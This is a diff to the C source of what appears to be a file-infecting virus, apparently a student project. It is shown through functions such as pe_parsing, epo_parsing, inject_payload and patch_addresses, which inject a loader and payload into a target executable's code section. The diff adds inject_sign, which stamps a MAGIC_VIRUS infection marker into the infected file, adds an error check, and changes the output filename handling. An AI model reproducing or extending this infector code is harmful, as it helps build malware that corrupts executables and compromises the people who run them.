@@ -149,6 +149,14 @@ int		reload_mapping(t_info *info)
 	return (0);
 }
 
+int		inject_sign(t_info *info)
+{
+	uint32_t magic = MAGIC_VIRUS;
+
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE, &magic, 4);
+	return (0);
+}
+
 int		main()
 {
 	char	buf[BUF_SIZE];
@@ -170,7 +178,8 @@ int		main()
 	pe_parsing(&info);
 	if (reload_mapping(&info) == 1)
 		return (1);
-	find_text(&info);
+	if (find_text(&info) == 1)
+		return (1);
 	epo_parsing(&info);
 	if (info.valid_target == 0)
 		return (1);
@@ -178,9 +187,10 @@ int		main()
 	inject_payload(&info);
 	inject_end(&info);
 	patch_addresses(&info);
+	inject_sign(&info);
 	ft_sysclose(fd);
-	write_filename_dest(buf);
-	ft_syswrite(1, buf, 12);
+	write_filename_src(buf);
+	ft_syswrite(1, buf, 9);
 	write_file(info, buf);
 	return (0);
 }
